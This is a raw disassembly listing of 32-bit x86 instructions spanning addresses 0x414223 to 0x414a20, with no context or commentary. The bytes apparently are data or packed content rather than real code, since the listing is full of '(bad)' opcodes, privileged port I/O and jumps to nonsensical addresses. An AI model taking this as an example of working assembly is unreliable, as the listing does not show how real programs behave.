  414223:	adc    BYTE PTR ds:0x51aa2ab8,al
  414229:	dec    esp
  41422a:	push   eax
  41422b:	ret    
  41422c:	mov    esi,esi
  41422e:	sub    BYTE PTR [ebx],cl
  414230:	xchg   ebx,eax
  414231:	xchg   ebx,eax
  414232:	loopne 0x414230
  414234:	repz mov al,0xf5
  414237:	inc    edx
  414238:	ret    
  414239:	rol    BYTE PTR ds:0xa5634a14,cl
  41423f:	sub    DWORD PTR [esi-0x21],edi
  414242:	call   0xac7af017
  414247:	jbe    0x414288
  414249:	bound  ebx,QWORD PTR [ecx+ebx*8+0x21]
  41424d:	dec    edx
  41424e:	sub    dh,BYTE PTR [eax-0x7df184a]
  414254:	cmp    al,0xa2
  414256:	xchg   ebx,eax
  414257:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414258:	fs addr16 jmp 0x3d25:0x35a6204d
  414261:	es dec ebx
  414263:	addr16 int 0x1e
  414266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414267:	push   ebp
  414268:	mov    esi,0x3d7361fa
  41426d:	jmp    0x356e1dd6
  414272:	pop    ebx
  414273:	out    0x80,al
  414275:	aam    0xc0
  414277:	mov    ebx,0x4860b3aa
  41427c:	jns    0x4142bb
  41427e:	and    BYTE PTR [esi+0x3598a81b],dl
  414284:	rcl    dl,1
  414286:	jb     0x414280
  414288:	xchg   esi,eax
  414289:	jb     0x414237
  41428b:	or     BYTE PTR [ebx+ecx*8],dl
  41428e:	pop    ecx
  41428f:	xchg   DWORD PTR [edi-0x4c],edx
  414292:	out    dx,al
  414293:	popf   
  414294:	xchg   edx,eax
  414295:	xlat   BYTE PTR ds:[ebx]
  414296:	jmp    0xb07232e9
  41429b:	fldcw  WORD PTR [edi]
  41429d:	lods   eax,DWORD PTR ds:[esi]
  41429e:	pop    eax
  41429f:	in     al,dx
  4142a0:	or     eax,0x4cb96d06
  4142a5:	sbb    eax,0xf6c3cdf9
  4142aa:	mov    eax,ds:0xd27e64be
  4142af:	mov    ah,0x3b
  4142b1:	xchg   BYTE PTR [eax-0x12],dl
  4142b4:	jbe    0x414267
  4142b6:	cmp    bh,BYTE PTR [edx+ebp*4+0x6d]
  4142ba:	jmp    0xeb8b:0x64129f02
  4142c1:	or     edx,ebp
  4142c3:	and    esi,ebx
  4142c5:	sahf   
  4142c6:	sar    BYTE PTR [eax+0x34983951],1
  4142cc:	sub    DWORD PTR [edi+0x36104c78],ebx
  4142d2:	adc    DWORD PTR fs:[edi],ebp
  4142d5:	add    bl,BYTE PTR [edi]
  4142d7:	push   0x9a4e7e62
  4142dc:	ds int 0x9e
  4142df:	push   ecx
  4142e0:	(bad)  
  4142e1:	imul   esi,DWORD PTR [esi+0x8],0x5dddf6d5
  4142e8:	mov    dh,dh
  4142ea:	jae    0x414360
  4142ec:	inc    DWORD PTR [eax]
  4142ee:	dec    ebx
  4142ef:	mov    BYTE PTR [ecx-0x76d3940],dl
  4142f5:	cmp    al,0x38
  4142f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142f8:	xchg   ebp,eax
  4142f9:	test   al,0x74
  4142fb:	adc    dh,BYTE PTR ds:0x2affb12f
  414301:	mov    ecx,0x443cc602
  414306:	sub    BYTE PTR [eax+0x29bf6d81],dh
  41430c:	cmp    BYTE PTR [edx+0x4df4fc65],0x64
  414313:	fild   QWORD PTR [ecx+ebx*1]
  414316:	into   
  414317:	and    bh,BYTE PTR [ebx+0xffd5483]
  41431d:	outs   dx,DWORD PTR ds:[esi]
  41431e:	dec    edi
  41431f:	idiv   edi
  414321:	imul   edx,DWORD PTR [ebx],0xffffff89
  414324:	jae    0x41432b
  414326:	jl     0x4142e6
  414328:	lock daa 
  41432a:	ficomp WORD PTR [edi]
  41432c:	push   esp
  41432d:	dec    esp
  41432e:	popa   
  41432f:	dec    edi
  414330:	xor    dl,al
  414332:	loop   0x414339
  414334:	(bad)  
  414335:	aam    0xdb
  414337:	xor    DWORD PTR [edi+ecx*4+0x705a1e9e],esp
  41433e:	add    esi,ebx
  414340:	mov    ebx,0x76b4e5f6
  414345:	stos   BYTE PTR es:[edi],al
  414346:	sar    esi,0x2b
  414349:	nop
  41434a:	xchg   esp,eax
  41434b:	cmp    dl,BYTE PTR [ebp+0x3c]
  41434e:	jmp    0x608c1399
  414353:	scas   al,BYTE PTR es:[edi]
  414354:	cs pop eax
  414356:	add    BYTE PTR [ebp+0x68c9d09],0x9c
  41435d:	in     al,dx
  41435e:	mov    ds:0xe53e1273,eax
  414363:	mov    al,ds:0x8166eb57
  414368:	inc    edi
  414369:	sbb    eax,0x67793d6e
  41436e:	push   edx
  41436f:	vpackssdw xmm0,xmm3,XMMWORD PTR [esi+0x65]
  414374:	jmp    0x41435b
  414376:	or     eax,0xdc5a9641
  41437b:	xchg   dh,al
  41437d:	stos   BYTE PTR es:[edi],al
  41437e:	fcom   st(1)
  414380:	in     al,dx
  414381:	xchg   ebp,eax
  414382:	jle    0x4143b0
  414384:	sbb    al,0x9
  414386:	fst    DWORD PTR [ecx]
  414388:	mov    eax,0x5585cecc
  41438d:	push   esi
  41438e:	cmp    BYTE PTR [eax+eiz*2-0x7187016f],bl
  414395:	popa   
  414396:	pop    ss
  414397:	in     al,dx
  414398:	pop    esi
  414399:	das    
  41439a:	dec    ecx
  41439b:	pop    ebx
  41439c:	es mov bl,0x9f
  41439f:	mov    BYTE PTR [edx+0x7a],bl
  4143a2:	cld    
  4143a3:	push   ebp
  4143a4:	jmp    0x414402
  4143a6:	std    
  4143a7:	jmp    0x4143d4
  4143a9:	pop    ds
  4143aa:	dec    ebp
  4143ab:	aam    0x77
  4143ad:	and    eax,0xbb09d8bf
  4143b2:	adc    ch,bh
  4143b4:	dec    edx
  4143b5:	std    
  4143b6:	shr    DWORD PTR [edi+0x4f76587],cl
  4143bc:	dec    ebx
  4143bd:	dec    esi
  4143be:	int3   
  4143bf:	aaa    
  4143c0:	push   esp
  4143c2:	push   edi
  4143c3:	scas   eax,DWORD PTR es:[edi]
  4143c4:	push   es
  4143c5:	in     eax,0x4
  4143c7:	fst    DWORD PTR [edi+0x2a]
  4143ca:	and    eax,0xbc58e446
  4143cf:	adc    BYTE PTR [ebx-0x5b],ch
  4143d2:	push   edx
  4143d3:	js     0x414384
  4143d5:	adc    DWORD PTR [ecx-0x1c],edi
  4143d8:	ja     0x41436a
  4143da:	mov    ds:0xa8e09f79,al
  4143df:	pop    ds
  4143e0:	add    BYTE PTR [esi+0x15e251c7],dh
  4143e6:	mov    ?,WORD PTR [ecx+ebx*2+0x60]
  4143ea:	sub    ebx,DWORD PTR [esi]
  4143ec:	xchg   DWORD PTR [edx-0x4da959aa],ebp
  4143f2:	mov    ds:0x852436be,eax
  4143f7:	hlt    
  4143f8:	out    0x1d,eax
  4143fa:	adc    al,0x7b
  4143fc:	add    eax,0x5c206b14
  414401:	out    0x2f,eax
  414403:	sbb    cl,BYTE PTR [ebp+0x24d8ed65]
  414409:	or     al,0xef
  41440b:	stos   BYTE PTR es:[edi],al
  41440c:	jns    0x414451
  41440e:	inc    esi
  41440f:	stos   DWORD PTR es:[edi],eax
  414410:	sub    cl,0x58
  414413:	imul   esp,esi,0xffffffd7
  414416:	jno    0x41439c
  414418:	out    0x1d,eax
  41441a:	push   ds
  41441b:	pop    esi
  41441c:	ficom  WORD PTR [edx-0xf]
  41441f:	jb     0x414440
  414421:	nop
  414422:	out    dx,al
  414423:	and    eax,0x3938f986
  414428:	sub    esi,DWORD PTR [esi+0x6b]
  41442b:	cdq    
  41442c:	mov    ecx,0xdbd50346
  414431:	mov    ecx,0xecb663c6
  414436:	inc    eax
  414437:	jae    0x414477
  414439:	inc    esi
  41443a:	pop    ss
  41443b:	push   ebp
  41443c:	sbb    edx,DWORD PTR [eax-0x3a]
  41443f:	add    DWORD PTR ds:0x90db631f,ecx
  414445:	inc    ebp
  414446:	xor    eax,0x3593ebda
  41444b:	lds    esp,FWORD PTR [edi-0x62d66076]
  414451:	jno    0x41449f
  414453:	cwde   
  414454:	xchg   ebp,eax
  414455:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414456:	sub    ah,BYTE PTR [edx+0x2762e026]
  41445c:	popa   
  41445d:	jne    0x4143f6
  41445f:	loopne 0x4144c8
  414461:	xchg   DWORD PTR [ebx],ebx
  414463:	out    0x78,eax
  414465:	adc    ch,bl
  414467:	inc    ecx
  414468:	inc    ebx
  414469:	adc    ebx,DWORD PTR [eax]
  41446b:	xlat   BYTE PTR ds:[ebx]
  41446c:	test   DWORD PTR [eax+ecx*4+0x49],0x95d173e0
  414474:	mov    WORD PTR [esi+0x15880bf4],cs
  41447a:	popa   
  41447b:	jmp    0xb173ad8a
  414480:	cmp    eax,0x5cf8b499
  414485:	loope  0x414494
  414487:	dec    ecx
  414488:	xchg   edi,eax
  414489:	xchg   ecx,eax
  41448a:	stos   BYTE PTR es:[edi],al
  41448b:	or     al,0xbd
  41448d:	add    al,bl
  41448f:	adc    eax,0xb0af8e81
  414494:	jb     0x4144ef
  414496:	ret    0x4d32
  414499:	leave  
  41449a:	imul   eax,DWORD PTR [eax],0x17
  41449d:	sbb    DWORD PTR [ebx],eax
  41449f:	inc    ebx
  4144a0:	cmp    ebp,edx
  4144a2:	js     0x4144c5
  4144a4:	lea    esp,[edi-0x73daac5c]
  4144aa:	test   eax,0xe305bb4
  4144af:	inc    edx
  4144b0:	and    ah,bh
  4144b2:	out    0x60,eax
  4144b4:	fsubr  DWORD PTR ds:0x159b8c40
  4144ba:	and    al,0xed
  4144bc:	sbb    ebx,esp
  4144be:	inc    ecx
  4144bf:	scas   al,BYTE PTR es:[edi]
  4144c0:	cmp    cl,al
  4144c2:	int    0x36
  4144c4:	pushf  
  4144c5:	mov    BYTE PTR [eax-0x20],dl
  4144c8:	pop    edi
  4144c9:	inc    ecx
  4144ca:	mov    ch,0x6
  4144cc:	ret    
  4144cd:	fldenv [ebx-0x36a8e46d]
  4144d3:	icebp  
  4144d4:	mov    edx,0x30762ea2
  4144d9:	or     esp,DWORD PTR [esi+0x5bc31aeb]
  4144df:	aas    
  4144e0:	inc    edx
  4144e1:	jge    0x414511
  4144e3:	out    0x3a,eax
  4144e5:	(bad)  
  4144e6:	jae    0x4144bb
  4144e8:	add    DWORD PTR [edi+0x250be815],eax
  4144ee:	test   al,0x29
  4144f0:	(bad)  
  4144f1:	xchg   ecx,eax
  4144f2:	retf   
  4144f3:	inc    edi
  4144f4:	push   edx
  4144f5:	leave  
  4144f6:	push   eax
  4144f7:	push   es
  4144f8:	lock in eax,dx
  4144fa:	mov    edi,0xe654ec89
  4144ff:	leave  
  414500:	int    0xa3
  414502:	sub    DWORD PTR [ecx+0x12],ebp
  414505:	mov    dh,0x0
  414507:	lods   eax,DWORD PTR ds:[esi]
  414508:	pop    ss
  414509:	mov    ds:0x9c6b745a,eax
  41450e:	dec    eax
  41450f:	pop    ss
  414510:	inc    edi
  414511:	lock inc ebx
  414513:	in     al,dx
  414514:	inc    edx
  414515:	cmp    DWORD PTR [eax-0x77848c3e],ebp
  41451b:	daa    
  41451c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41451d:	pop    edx
  41451e:	adc    BYTE PTR [edi+eax*8-0x39],0x5d
  414523:	ret    
  414524:	jmp    0x414549
  414526:	jne    0x41457a
  414528:	cmovo  eax,DWORD PTR [edi]
  41452b:	ror    DWORD PTR [esi-0x5ce3afb9],cl
  414531:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414532:	jp     0x4145a7
  414534:	stc    
  414535:	xchg   edx,eax
  414536:	xor    DWORD PTR [esi-0xf],esp
  414539:	push   ss
  41453a:	push   DWORD PTR [ecx]
  41453c:	sbb    BYTE PTR [ecx],bl
  41453e:	retf   0x34b6
  414541:	neg    DWORD PTR [eax]
  414543:	lahf   
  414544:	repz mov WORD PTR [esi+ebx*2],?
  414548:	shr    cl,cl
  41454a:	lods   eax,DWORD PTR ds:[esi]
  41454b:	inc    edx
  41454c:	enter  0xf7ba,0x5e
  414550:	out    dx,eax
  414551:	pop    esi
  414552:	xchg   ebx,eax
  414553:	fs dec edx
  414555:	dec    eax
  414556:	push   ds
  414557:	add    ecx,edi
  414559:	fiadd  WORD PTR [eax]
  41455b:	dec    eax
  41455c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41455d:	push   es
  41455e:	(bad)  
  41455f:	push   ecx
  414560:	cld    
  414561:	inc    edx
  414562:	mov    al,0xea
  414564:	lds    ebp,FWORD PTR [ecx]
  414566:	imul   eax,DWORD PTR [edi+0x4f],0xd92f2754
  41456d:	jbe    0x4145e6
  41456f:	or     edx,DWORD PTR ds:0x3417f9b4
  414575:	sub    al,0xf5
  414577:	lock rcr BYTE PTR [ebx],1
  41457a:	leave  
  41457b:	mov    dh,0x49
  41457d:	mov    dh,0xd4
  41457f:	lahf   
  414580:	xor    ebx,DWORD PTR [edi-0x40a12280]
  414586:	call   0x6cf1:0x13fbbebf
  41458d:	xor    BYTE PTR es:[ecx],ah
  414590:	pop    ds
  414591:	fidivr DWORD PTR [edx+0x2439b0]
  414597:	daa    
  414598:	scas   al,BYTE PTR es:[edi]
  414599:	ret    0xd38d
  41459c:	(bad)  
  41459d:	sub    ebx,ebp
  41459f:	pop    ds
  4145a0:	fist   WORD PTR [esi+0x5e]
  4145a3:	push   0x2d
  4145a5:	test   al,0x5e
  4145a7:	xchg   DWORD PTR [esp+edi*1+0x181fc59a],ebx
  4145ae:	sub    edx,DWORD PTR [edi+0x60e7edff]
  4145b4:	mov    edx,0xb09e203b
  4145b9:	adc    DWORD PTR [ebx-0x4d],0xffffffc6
  4145bd:	dec    edi
  4145bf:	add    DWORD PTR [ecx+0x67],eax
  4145c2:	hlt    
  4145c3:	repz mov esp,0x3db2b20f
  4145c9:	leave  
  4145ca:	div    DWORD PTR [eax-0x629577c0]
  4145d0:	pextrw ecx,(bad),0xc5
  4145d2:	or     dh,ch
  4145d4:	clc    
  4145d5:	xchg   esp,eax
  4145d6:	sbb    al,0x62
  4145d8:	mov    ebp,0x56c3de3c
  4145dd:	jp     0x4145ef
  4145df:	dec    esp
  4145e0:	lea    edi,[ebx+0x7d]
  4145e3:	test   eax,0x626493d6
  4145e8:	xor    eax,0x507b46cb
  4145ed:	mov    bl,0x5
  4145ef:	mov    esp,0x80654753
  4145f4:	mov    BYTE PTR [edi-0x49b390ea],0xb2
  4145fb:	jl     0x41459d
  4145fd:	mov    DWORD PTR [ebx+0x25],edi
  414600:	add    ebx,eax
  414602:	and    bl,BYTE PTR [edx-0x530302c1]
  414608:	aam    0x4c
  41460a:	push   esp
  41460b:	test   BYTE PTR [ecx+ebp*1-0xb9d289f],0x9b
  414613:	imul   ebx,ecx,0xeda9e2c0
  414619:	aaa    
  41461a:	cli    
  41461b:	jl     0x4145e6
  41461d:	fnstsw WORD PTR [edx-0x71b5ff0f]
  414623:	mov    edx,0x25f8668b
  414628:	int    0xf3
  41462a:	fucom  st(2)
  41462c:	cmp    BYTE PTR [esi],al
  41462e:	out    dx,al
  41462f:	xchg   edi,eax
  414630:	sbb    al,0xfa
  414632:	pop    es
  414633:	xor    ebp,0xa129ea82
  414639:	das    
  41463a:	cmp    eax,0x86ee1256
  41463f:	sbb    esp,DWORD PTR [esi-0x7d]
  414642:	fwait
  414643:	ja     0x41469e
  414645:	adc    eax,DWORD PTR [edx+0x617b3b56]
  41464b:	mov    cl,0x80
  41464d:	jl     0x414628
  41464f:	xchg   DWORD PTR [esi+0x102c795a],ebx
  414655:	pcmpeqb mm4,QWORD PTR [ebx+0x33]
  414659:	neg    DWORD PTR ds:0xd989c651
  41465f:	push   ss
  414660:	sbb    ch,al
  414662:	mov    dh,0x9
  414664:	and    DWORD PTR [edi-0x13],esp
  414667:	lods   al,BYTE PTR ds:[esi]
  414668:	mov    ah,0xc0
  41466a:	push   ecx
  41466b:	ror    BYTE PTR [edi-0x72],cl
  41466e:	and    eax,DWORD PTR [esi-0x5d]
  414671:	nop
  414672:	dec    ebx
  414673:	adc    edi,esi
  414675:	das    
  414676:	jg     0x4145ff
  414678:	or     DWORD PTR [edx-0x7],0xffffffd4
  41467c:	dec    ecx
  41467d:	mov    ah,al
  41467f:	gs out dx,eax
  414681:	cmp    al,dh
  414683:	shl    BYTE PTR [ecx-0xf],1
  414686:	shr    BYTE PTR [edx-0x37],1
  414689:	dec    ecx
  41468a:	scas   eax,DWORD PTR es:[edi]
  41468b:	or     eax,0x9ced1d60
  414690:	or     BYTE PTR [ebp-0x168646e9],cl
  414696:	sbb    al,0xce
  414698:	imul   esi,DWORD PTR [esi+edx*8-0xf],0xffffffb0
  41469d:	xor    al,0x18
  41469f:	mov    al,ds:0x7f73700d
  4146a4:	or     al,0x7
  4146a6:	sahf   
  4146a7:	bound  esp,QWORD PTR [edx+esi*4-0x2ae38f80]
  4146ae:	stos   BYTE PTR es:[edi],al
  4146af:	or     ebx,DWORD PTR [edi]
  4146b1:	dec    ebx
  4146b2:	fs (bad) 
  4146b4:	xor    al,0x7e
  4146b6:	sbb    BYTE PTR [edi+edi*2],dl
  4146b9:	iret   
  4146ba:	adc    al,0xef
  4146bc:	pop    es
  4146bd:	stc    
  4146be:	vandpd ymm6,ymm6,YMMWORD PTR [edi+0x3eb5e9ac]
  4146c6:	xchg   DWORD PTR [ecx+0x6b],eax
  4146c9:	push   eax
  4146ca:	ror    ch,1
  4146cc:	adc    BYTE PTR [ebp+0x5ad361de],ah
  4146d2:	mov    ebx,0xa36c0d44
  4146d7:	xchg   edi,eax
  4146d8:	mov    ebx,0x96d0eabf
  4146dd:	imul   edx,DWORD PTR [esi],0x3c
  4146e0:	pushf  
  4146e1:	mov    bl,0x77
  4146e3:	or     BYTE PTR [eax+0x3e],ch
  4146e6:	jl     0x414766
  4146e8:	adc    DWORD PTR ds:0x7d009a80,esi
  4146ee:	aas    
  4146ef:	addr16 mov esi,0x7a4be0bd
  4146f5:	stos   DWORD PTR es:[edi],eax
  4146f6:	mov    ah,0x53
  4146f8:	outs   dx,BYTE PTR ds:[esi]
  4146f9:	jge    0x41467d
  4146fb:	sbb    ebx,edi
  4146fd:	mov    ecx,0xa3e8b801
  414702:	dec    eax
  414703:	stos   BYTE PTR es:[edi],al
  414704:	cmp    al,0x2b
  414706:	xlat   BYTE PTR ss:[ebx]
  414708:	mov    ebp,0x35902574
  41470d:	pusha  
  41470e:	int    0x80
  414710:	mov    ebp,0x5bbf0b17
  414715:	lahf   
  414716:	sahf   
  414717:	add    edi,DWORD PTR [ebx+0x64]
  41471a:	sbb    cl,bl
  41471c:	sbb    esp,DWORD PTR [eax]
  41471e:	push   eax
  41471f:	cmp    BYTE PTR ds:0x5754d0cf,cl
  414725:	mov    al,0x59
  414727:	lock or al,0xed
  41472a:	xchg   esi,eax
  41472b:	cld    
  41472c:	push   ebx
  41472d:	adc    eax,0x55ef24af
  414732:	jl     0x414712
  414734:	or     DWORD PTR [esi+esi*4-0x60a07ecb],edx
  41473b:	add    DWORD PTR [ebx+0x627fbb2d],edi
  414741:	inc    edi
  414742:	jl     0x4146f4
  414744:	lahf   
  414745:	hlt    
  414746:	xor    eax,0x563c0dd7
  41474b:	sbb    al,0x4c
  41474d:	(bad)  
  41474e:	loop   0x41476c
  414750:	jle    0x414735
  414752:	mov    dl,0x4a
  414754:	sbb    eax,0x9205fd99
  414759:	call   0x67e2f2df
  41475e:	mov    edi,0xbaccce0
  414763:	adc    edi,DWORD PTR [esp+eiz*2+0x3f]
  414767:	pop    es
  414768:	pop    esp
  414769:	sub    ah,BYTE PTR [ebp+esi*1+0xa]
  41476d:	xor    DWORD PTR [eax],edx
  41476f:	push   edi
  414770:	repz ret 0x75f8
  414774:	pop    esp
  414775:	clc    
  414776:	dec    esp
  414777:	leave  
  414778:	es mov dh,0x23
  41477b:	lods   al,BYTE PTR ds:[esi]
  41477c:	xchg   dh,bl
  41477e:	or     ebp,DWORD PTR ds:[ebx+0x32]
  414782:	loope  0x4147f9
  414784:	mov    edx,0x1b3da5d8
  414789:	inc    esi
  41478a:	dec    ecx
  41478b:	daa    
  41478c:	jl     0x414763
  41478e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41478f:	aad    0xe
  414791:	push   esp
  414792:	pop    ss
  414793:	fidiv  DWORD PTR ds:0xc02cb0a9
  414799:	(bad)  
  41479b:	mov    edi,0x523e2871
  4147a0:	ret    0xf178
  4147a3:	jmp    0x4147c6
  4147a5:	neg    BYTE PTR [esi]
  4147a7:	mov    ah,0x17
  4147a9:	aam    0x79
  4147ab:	jmp    0x39b4c68b
  4147b0:	jecxz  0x4147ef
  4147b2:	dec    esp
  4147b3:	inc    ebx
  4147b4:	int3   
  4147b5:	mov    dl,0xe8
  4147b7:	nop
  4147b8:	mov    ds:0xe0c879e,al
  4147bd:	fs mov cl,0x9d
  4147c0:	xchg   edx,eax
  4147c1:	pop    ebx
  4147c2:	inc    edx
  4147c3:	jnp    0x4147cf
  4147c5:	xchg   esi,eax
  4147c6:	ret    0xe4ae
  4147c9:	icebp  
  4147ca:	sahf   
  4147cb:	sbb    al,0xa
  4147cd:	fdiv   QWORD PTR [ebx-0x489ed011]
  4147d3:	and    al,0xda
  4147d5:	jae    0x414840
  4147d7:	sub    cl,BYTE PTR [edi]
  4147d9:	or     al,0xc3
  4147db:	ret    0xe5ea
  4147de:	rol    DWORD PTR [edx-0x70],1
  4147e1:	and    al,0xfb
  4147e3:	and    ecx,DWORD PTR [edx-0x32]
  4147e6:	xchg   DWORD PTR [edi-0x486e39df],edi
  4147ec:	cmp    BYTE PTR [ebx-0x5b],0x22
  4147f0:	(bad)
  4147f3:	sbb    DWORD PTR [eax+0x1c],0x58
  4147f7:	test   BYTE PTR [esi],ah
  4147f9:	repnz mov ebp,0x69ffa2bc
  4147ff:	sbb    BYTE PTR [ecx],cl
  414801:	loopne 0x41487b
  414803:	jge    0x414792
  414805:	sub    al,0x8e
  414807:	lahf   
  414808:	ss pop ds
  41480a:	call   0x32b8fba4
  41480f:	(bad)  
  414810:	fsub   st(5),st
  414812:	inc    esi
  414813:	inc    eax
  414814:	int3   
  414815:	aam    0x53
  414817:	push   ebp
  414818:	jo     0x414892
  41481a:	or     ebx,ecx
  41481c:	fs mov cl,0xe2
  41481f:	aad    0x61
  414821:	inc    edi
  414822:	jg     0x414818
  414824:	add    al,0x2e
  414826:	adc    BYTE PTR [ebx-0x7b6e75f5],al
  41482c:	pop    eax
  41482d:	cld    
  41482e:	push   0xfded54c9
  414833:	cmp    al,0x36
  414835:	jl     0x41487d
  414837:	sub    ah,BYTE PTR [ecx+0x43e435a5]
  41483d:	adc    al,0x12
  41483f:	mov    ch,BYTE PTR [edi]
  414841:	hlt    
  414842:	inc    esp
  414843:	xchg   edi,eax
  414844:	icebp  
  414845:	rcl    BYTE PTR [ecx-0x1deb0d31],cl
  41484b:	pop    es
  41484c:	scas   eax,DWORD PTR es:[edi]
  41484d:	dec    ebp
  41484e:	inc    ebp
  41484f:	test   DWORD PTR [eax],ebp
  414851:	jo     0x414895
  414853:	xchg   DWORD PTR ds:0x9c2dc68b,ecx
  414859:	call   0x3461:0x24e5a8fb
  414860:	xor    bh,ch
  414862:	jno    0x4147ef
  414864:	adc    al,0xad
  414866:	es in  eax,dx
  414868:	add    BYTE PTR [edi-0x4815c0b7],al
  41486e:	or     eax,0x599197b8
  414873:	les    ebx,FWORD PTR [esi]
  414875:	xchg   edi,eax
  414876:	(bad)  
  414877:	sar    dh,cl
  414879:	out    0x53,al
  41487b:	adc    al,0x8f
  41487d:	cmp    bh,0x52
  414880:	mov    ecx,0x31825b94
  414885:	jle    0x414874
  414887:	push   0xfac29115
  41488c:	or     esp,DWORD PTR [ecx-0x7cc69e7e]
  414892:	sahf   
  414893:	into   
  414894:	fistp  WORD PTR [esi]
  414896:	push   esp
  414897:	pop    es
  414898:	jmp    0x414847
  41489a:	nop
  41489b:	mov    bh,0x9c
  41489d:	aam    0xe2
  41489f:	adc    DWORD PTR [esi],edx
  4148a1:	pop    eax
  4148a2:	sbb    dh,BYTE PTR [edx+eiz*4]
  4148a5:	mov    ch,BYTE PTR [edi]
  4148a7:	inc    esi
  4148a8:	enter  0x84e8,0x83
  4148ac:	pop    edi
  4148ad:	xchg   ecx,eax
  4148ae:	mov    ebp,0xfcb48be9
  4148b3:	mov    edx,0xfe175cb2
  4148b8:	pushf  
  4148b9:	mov    ch,0xb
  4148bb:	add    al,dh
  4148bd:	jno    0x41492e
  4148bf:	repnz pop esi
  4148c1:	rol    BYTE PTR [esi-0x40],1
  4148c4:	je     0x41487d
  4148c6:	adc    al,0x68
  4148c8:	sub    DWORD PTR [esi-0xa],esi
  4148cb:	not    BYTE PTR [esi+edx*4-0x2b]
  4148cf:	stc    
  4148d0:	es mov bl,0x26
  4148d3:	or     edi,esp
  4148d5:	push   edx
  4148d6:	cmp    ch,BYTE PTR [ebp-0x1dadffd9]
  4148dc:	jmp    0xa9a904a7
  4148e1:	add    al,0x53
  4148e3:	addr16 loopne 0x414873
  4148e6:	(bad)
  4148e9:	mov    ch,0xdc
  4148eb:	xchg   ecx,eax
  4148ec:	repz mov esp,0x91c92de8
  4148f2:	data16 lahf 
  4148f4:	cs scas al,BYTE PTR es:[edi]
  4148f6:	mov    esi,0x542e9670
  4148fb:	xor    eax,DWORD PTR [esp+eiz*2-0x54]
  4148ff:	sub    eax,0xec9a8e14
  414904:	mov    bl,0x6a
  414906:	mov    ebp,0xfd2e139d
  41490b:	or     bl,BYTE PTR [ebx+ebp*8-0x2b]
  41490f:	xchg   edx,eax
  414910:	inc    ebx
  414911:	pop    ss
  414912:	js     0x414931
  414914:	mov    esp,0x1606313
  414919:	sub    edx,edi
  41491b:	cmp    ch,BYTE PTR [ecx-0x10ddf8f4]
  414921:	jecxz  0x4148a3
  414923:	xchg   esi,eax
  414924:	shl    esi,0x2c
  414927:	stc    
  414928:	pushf  
  414929:	xor    eax,0xf67848cc
  41492e:	mov    al,ds:0x3e8e2cab
  414933:	lea    edx,[ecx+0x528fe1a9]
  414939:	mov    eax,ds:0xcdba5b40
  41493e:	push   edi
  41493f:	mov    ebx,0x54d89bab
  414944:	lahf   
  414945:	fwait
  414946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414947:	imul   edi,DWORD PTR [ebp-0x1055433e],0x67a29585
  414951:	xchg   ebp,eax
  414952:	aas    
  414953:	jno    0x414948
  414955:	inc    ecx
  414956:	add    DWORD PTR [edx+esi*2],esp
  414959:	or     bl,BYTE PTR [eax+0x6e61dc03]
  41495f:	push   0x44ba9e1c
  414964:	jae    0x4149d6
  414966:	adc    esp,esp
  414968:	not    BYTE PTR [ebx+ecx*1-0xbc9928e]
  41496f:	pop    esi
  414970:	aam    0xbe
  414972:	mov    ebp,0x5766a1ac
  414977:	iret   
  414978:	cmp    eax,0x1412cbda
  41497d:	sbb    eax,DWORD PTR [ebp+0x6111e39d]
  414983:	pop    es
  414984:	dec    esp
  414985:	iret   
  414986:	inc    edx
  414987:	outs   dx,BYTE PTR ds:[esi]
  414988:	daa    
  414989:	jl     0x414922
  41498b:	add    al,BYTE PTR [eax-0x7e]
  41498e:	leave  
  41498f:	das    
  414990:	outs   dx,BYTE PTR ds:[esi]
  414991:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414992:	ins    DWORD PTR es:[edi],dx
  414993:	repnz xchg ebx,eax
  414995:	in     al,0xb6
  414997:	pop    ecx
  414998:	ror    BYTE PTR [edx],0x15
  41499b:	sub    cl,bh
  41499d:	ret    
  41499e:	inc    edi
  41499f:	add    BYTE PTR [esi-0x12],bh
  4149a2:	(bad)
  4149a6:	or     DWORD PTR [edx-0x21],esp
  4149a9:	imul   esi,edx,0x7e879ed2
  4149af:	mov    eax,0xed433c28
  4149b4:	xchg   ecx,eax
  4149b5:	ret    0xba45
  4149b8:	dec    edx
  4149b9:	daa    
  4149ba:	stc    
  4149bb:	jmp    0x414942
  4149bd:	(bad)  
  4149be:	jecxz  0x4149f0
  4149c0:	fstp   DWORD PTR [esi]
  4149c2:	cmc    
  4149c3:	bound  esp,QWORD PTR [esi]
  4149c5:	or     esi,DWORD PTR [ecx]
  4149c7:	mov    ds:0x11ba1112,eax
  4149cc:	push   es
  4149cd:	dec    esp
  4149ce:	xchg   edi,eax
  4149cf:	pop    es
  4149d0:	sbb    ecx,ebx
  4149d2:	(bad)
  4149d5:	cli    
  4149d6:	cdq    
  4149d7:	push   ecx
  4149d8:	ds (bad) 
  4149da:	or     BYTE PTR [edi+eiz*1],cl
  4149dd:	add    eax,0xa192ac4d
  4149e2:	mov    dh,0x33
  4149e4:	ss aad 0xad
  4149e7:	cli    
  4149e8:	pop    ebx
  4149e9:	xor    BYTE PTR [ebp+0x12],dh
  4149ec:	sbb    eax,0x6502dc3d
  4149f1:	add    bh,bh
  4149f3:	mov    ecx,0x90082592
  4149f8:	lahf   
  4149f9:	dec    esp
  4149fa:	xor    bl,dh
  4149fc:	shl    BYTE PTR [eax+0x70],0x62
  414a00:	int    0xff
  414a02:	fcomp  DWORD PTR [esi+0x1dd8935c]
  414a08:	xchg   ecx,eax
  414a09:	cmp    BYTE PTR [ebx],ch
  414a0b:	xchg   DWORD PTR [esi-0x6a],eax
  414a0e:	sbb    eax,0xa6dfcce
  414a13:	push   edi
  414a14:	mov    dl,0x18
  414a16:	sbb    eax,DWORD PTR [eax]
  414a18:	mov    dh,0xd2
  414a1a:	outs   dx,DWORD PTR ds:[esi]
  414a1b:	dec    ebp
  414a1c:	repnz inc edi
  414a1e:	xlat   BYTE PTR ds:[ebx]
  414a1f:	stc    
  414a20:	mov    ds:0x8acfb4c2,al
